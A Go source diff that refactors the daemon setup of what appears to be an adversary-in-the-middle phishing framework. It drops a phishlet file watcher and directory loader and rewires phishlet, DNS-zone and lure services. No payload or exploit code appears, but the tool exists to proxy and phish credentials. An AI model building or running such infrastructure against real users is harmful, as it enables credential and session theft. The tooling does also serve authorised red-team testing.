@@ -7,7 +7,6 @@ import (
 	"net/http"
 	"os"
 	"path/filepath"
-	"strings"
 
 	"github.com/travisbale/mirage/internal/aitm"
 	"github.com/travisbale/mirage/internal/api"
@@ -25,7 +24,6 @@ import (
 	"github.com/travisbale/mirage/internal/redirect"
 	"github.com/travisbale/mirage/internal/spoof"
 	"github.com/travisbale/mirage/internal/store/sqlite"
-	"github.com/travisbale/mirage/sdk"
 )
 
 type scriptObfuscator interface {
@@ -44,12 +42,10 @@ type Daemon struct {
 	cfg *config.Config
 
 	// Infrastructure.
-	db                *sqlite.DB
-	bus               *events.Bus
-	dnsService        *aitm.DNSService
-	watcher           *phishlet.Watcher
-	phishletReloadSub <-chan aitm.Event
-	certSource        aitm.CertSource
+	db         *sqlite.DB
+	bus        *events.Bus
+	dnsService *aitm.DNSService
+	certSource aitm.CertSource
 
 	// Proxy.
 	proxy *proxy.Server
@@ -122,8 +118,6 @@ func New(configPath string, version string, logger *slog.Logger) (*Daemon, error
 		return nil, err
 	}
 
-	ini.initWatcher()
-
 	return ini.Daemon, nil
 }
 
@@ -154,16 +148,17 @@ func (ini *initializer) initPhishlets() error {
 // needed by DNSService. This is separate from LoadActiveFromDB so DNS can be
 // initialised before PhishletService is fully wired.
 func (ini *initializer) extractZones(externalIP string) (map[string]aitm.ZoneConfig, error) {
-	phishlets, err := ini.phishletStore.ListPhishlets()
+	enabled := true
+	configs, err := ini.phishletStore.ListConfigs(aitm.PhishletFilter{Enabled: &enabled})
 	if err != nil {
 		return nil, fmt.Errorf("listing phishlets: %w", err)
 	}
 	zones := make(map[string]aitm.ZoneConfig)
-	for _, phishlet := range phishlets {
-		if phishlet.Enabled && phishlet.BaseDomain != "" && phishlet.DNSProvider != "" {
-			zones[phishlet.BaseDomain] = aitm.ZoneConfig{
-				Zone:         phishlet.BaseDomain,
-				ProviderName: phishlet.DNSProvider,
+	for _, cfg := range configs {
+		if cfg.BaseDomain != "" && cfg.DNSProvider != "" {
+			zones[cfg.BaseDomain] = aitm.ZoneConfig{
+				Zone:         cfg.BaseDomain,
+				ProviderName: cfg.DNSProvider,
 				ExternalIP:   externalIP,
 			}
 		}
@@ -234,13 +229,16 @@ func (ini *initializer) initServices() error {
 	ini.blacklistSvc = aitm.NewBlacklistService(ini.bus)
 	ini.spoofer = spoof.NewServer(ini.cfg.SpoofURL, proxy.SessionCookieName, ini.logger)
 
-	var phishletSvc *aitm.PhishletService
-	if len(ini.dnsProviders) == 0 {
-		phishletSvc = aitm.NewPhishletService(ini.phishletStore, ini.bus, aitm.NopDNSReconciler{}, ini.lureStore, ini.logger)
-	} else {
-		phishletSvc = aitm.NewPhishletService(ini.phishletStore, ini.bus, ini.dnsService, ini.lureStore, ini.logger)
+	phishletSvc := &aitm.PhishletService{
+		Store:    ini.phishletStore,
+		Bus:      ini.bus,
+		DNS:      aitm.NopDNSReconciler{},
+		Resolver: phishlet.NewResolver(ini.lureStore, ini.logger),
+		Compiler: phishlet.Compiler{},
 	}
-	ini.loadPhishlets(ini.cfg.PhishletsDir, phishletSvc)
+	if len(ini.dnsProviders) > 0 {
+		phishletSvc.DNS = ini.dnsService
+	}
 	if err := phishletSvc.LoadFromDB(); err != nil {
 		return fmt.Errorf("loading phishlets from db: %w", err)
 	}
@@ -351,21 +349,6 @@ func (ini *initializer) initProxy(version string) error {
 	return nil
 }
 
-func (ini *initializer) initWatcher() {
-	var err error
-	ini.watcher, err = phishlet.NewWatcher(ini.cfg.PhishletsDir, ini.bus)
-	if err != nil {
-		ini.logger.Warn("phishlet watcher unavailable — live reload disabled", "error", err)
-		return
-	}
-	ini.phishletReloadSub = aitm.SubscribeFunc(ini.bus, sdk.EventPhishletReloaded, func(ev aitm.Event) {
-		if p, ok := ev.Payload.(*aitm.Phishlet); ok {
-			ini.phishletSvc.Register(p)
-		}
-	})
-	ini.watcher.Start()
-}
-
 // SetUpstreamTransport replaces the transport used to forward requests to the
 // upstream origin. Intended for testing only — inject a transport that dials a
 // local httptest.Server so tests don't need real DNS or internet access.
@@ -374,36 +357,6 @@ func (d *Daemon) SetUpstreamTransport(rt http.RoundTripper) {
 }
 
 // ---- helpers ----------------------------------------------------------------
-
-func (d *Daemon) loadPhishlets(dir string, svc *aitm.PhishletService) {
-	entries, err := os.ReadDir(dir)
-	if err != nil {
-		d.logger.Warn("could not read phishlets directory", "dir", dir, "error", err)
-		return
-	}
-
-	loader := &phishlet.Loader{}
-	for _, entry := range entries {
-		if entry.IsDir() {
-			continue
-		}
-
-		name := strings.ToLower(entry.Name())
-		if !strings.HasSuffix(name, ".yaml") && !strings.HasSuffix(name, ".yml") {
-			continue
-		}
-
-		path := filepath.Join(dir, entry.Name())
-		def, err := loader.Load(path)
-		if err != nil {
-			d.logger.Error("failed to load phishlet", "path", path, "error", err)
-			continue
-		}
-
-		svc.Register(def)
-		d.logger.Info("loaded phishlet", "name", def.Name)
-	}
-}
 
 func loadConfig(path string) (*config.Config, error) {
 	cfg, err := config.Load(path)
